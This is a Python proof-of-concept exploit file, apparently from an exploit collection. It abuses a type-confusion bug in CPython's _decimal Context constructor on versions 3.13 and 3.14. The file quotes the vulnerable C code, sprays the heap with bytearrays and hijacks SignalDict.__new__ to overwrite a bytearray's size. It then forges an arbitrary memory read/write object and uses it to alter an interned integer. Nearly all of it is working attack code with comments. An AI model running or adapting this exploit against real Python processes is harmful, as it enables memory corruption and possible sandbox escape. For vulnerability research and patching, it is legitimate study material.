"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Abuse type confusion bug to set the size of a bytearray object to an absurdly large number
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/3.14/Modules/_decimal/_decimal.c#L1387-L1428
"""
static PyObject *
context_new(PyTypeObject *type,
            PyObject *Py_UNUSED(args), PyObject *Py_UNUSED(kwds))
{
    PyDecContextObject *self = NULL;
    mpd_context_t *ctx;

    decimal_state *state = get_module_state_by_def(type);
    if (type == state->PyDecContext_Type) {
        self = PyObject_GC_New(PyDecContextObject, state->PyDecContext_Type);
    }
    else {
        self = (PyDecContextObject *)type->tp_alloc(type, 0);
    }

    if (self == NULL) {
        return NULL;
    }

    self->traps = PyObject_CallObject((PyObject *)state->PyDecSignalDict_Type, NULL); // <--- simulates SignalDict() but assumes the return value is a SignalDict
    if (self->traps == NULL) {
        self->flags = NULL;
        Py_DECREF(self);
        return NULL;
    }
    self->flags = PyObject_CallObject((PyObject *)state->PyDecSignalDict_Type, NULL); // <--- simulates SignalDict() but assumes the return value is a SignalDict
    if (self->flags == NULL) {
        Py_DECREF(self);
        return NULL;
    }

    ctx = CTX(self);

    if (state->default_context_template) {
        *ctx = *CTX(state->default_context_template);
    }
    else {
        *ctx = dflt_ctx;
    }

    SdFlagAddr(self->traps) = &ctx->traps; // <--- writes to self->traps->flags, but self->traps is actually a controlled (non-SignalDict) object if exploited
    SdFlagAddr(self->flags) = &ctx->status; // <--- writes to self->flags->flags, but self->flags is actually a controlled (non-SignalDict) object if exploited
"""

# NOTE: this bug also exists in `context_copy` in _decimal.c but the setup looks to be a little more complicated

import _decimal
from common import evil_bytearray_obj, PTR_SIZE

# Spam a whole bunch of bytearrays to set up memory in a way where it's arranged as
# ba header + ba buffer + ba header + ba buffer + ...

# This exploit uses the second to last bytearray created as the one to have
# its `ob_size` overwritten which can then be used to write OOB into the
# last object
spray = [bytearray(bytearray.__basicsize__) for _ in range(50)]

to_break = spray[-2]
mem = spray[-1]

def evil(*args, **kwargs):
    return to_break

# overwrite SignalDict's __new__ func to return an object that
# isn't actually of type `SignalDict`
SignalDict = type(_decimal.getcontext().flags)
SignalDict.__new__ = evil

# create a new context to trigger the bug.
# in the initialization, it writes to the `PyDecSignalDictObject`'s
# `flags` struct member, but with our setup it's actually overwriting
# our bytearray's `ob_size` causing the length of `to_break` to become absurdly large 
_decimal.Context()

# see ./common/common.py for evil bytearray obj explanation
fake_obj, _ = evil_bytearray_obj()

# With `to_break` being able to write OOB now, we can overwrite the object ahead of it
# (in this case, `mem`) to be whatever we want. This is overwriting `mem`'s struct data
# so it becomes a bytearray which can read/write anywhere in memory
OFFSET = bytearray.__basicsize__ + PTR_SIZE
to_break[OFFSET : OFFSET + len(fake_obj)] = fake_obj

# exploit is a tad inconsistent sometimes
if len(mem) == bytearray.__basicsize__:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100